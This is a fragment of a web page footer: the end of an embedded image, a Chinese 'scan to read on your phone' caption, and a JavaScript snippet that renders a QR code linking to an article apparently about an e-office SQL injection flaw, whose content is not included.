WR1s1v/3AkcBlJTmq1VW7P6chifDnVzHfU7QvqoQ7j16oVqkAyMWJlaEH2VV69sLXidh/gQ7PXVo5Y6jDn1wsNASrzX753ANhDI1OA1vrvVeiL2C173hdFf3cee+vCs655ctOaMm4P0XnF1+4nqkHoY8ZW/DcTQjb97AvdAfvf8D3f/DwAA///5rKlCAAAABklEQVQDACdRjMt9eXQRAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-workflow-runimgflow-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 